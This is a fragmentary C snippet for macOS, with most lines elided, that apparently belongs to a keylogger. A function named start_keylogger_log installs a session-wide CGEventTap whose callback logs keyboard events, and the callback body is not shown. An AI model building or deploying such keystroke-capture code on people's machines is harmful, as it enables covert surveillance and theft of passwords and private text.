...
void * start_keylogger_log(){
    ...
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback_log, NULL);
...
CGEventRef CGEventCallback_log(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
